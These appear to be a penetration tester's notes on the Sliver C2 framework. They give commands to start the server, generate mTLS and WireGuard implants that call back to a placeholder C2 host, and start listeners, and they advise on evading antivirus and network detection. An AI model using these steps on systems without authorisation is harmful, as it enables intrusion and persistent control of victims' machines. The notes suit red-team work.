Sliver C2 is a powerful post-exploitation framework that can be used to establish a firm foothold on a device with an extensible interface that reminds the user of Meterpreter. It is detected out of the box by most AV solutions, as it is very popular, but it can be obfuscated and otherwise made to evade detection. 

Documentation can be found here: https://sliver.sh/docs

# Server
```shell
sliver-server # start the server
```

The server functions as a fully featured point of interaction, and it is not required to use the client at all if no multiplayer is going to be used. However, if multiple operators will need to interact with compromised hosts, multiplayer mode will need to be enabled, and configuration files will need to be generated. 

# Multiplayer
TODO: Flesh out multiplayer enable and configuration generation

# Implant Generation
All of the implants generation is taken care of by the `generate` command. Sliver supports HTTP, DNS, WireGuard, TCP, and mTLS callbacks for both sessions and beacons. While these can be used for evasion, mTLS is a safer bet for avoiding NIDS because of its builtin and thorough encryption both directions. 

```bash
generate --mtls <FQDN of C2:port> --os <target operating system> --arch <target CPU architecture> --save <local save location> # generate an mTLS session sliver

generate beacon --wg <FQDN of C2:port> --os <target operating system> --arch <target CPU architecture> # generate a WireGuard beacon sliver
```

Sliver also supports multiple protocols per implant, with it defaulting between them in this order: mTLS -> WireGuard -> HTTP(S) -> DNS.

You must individually start jobs receiving new connections for each protocol

```bash
mtls # start an mTLS listener
dns # start a DNS listener
# etc...
```

# Armory
TODO: Give more details on loading armory modules and how to use them effectively.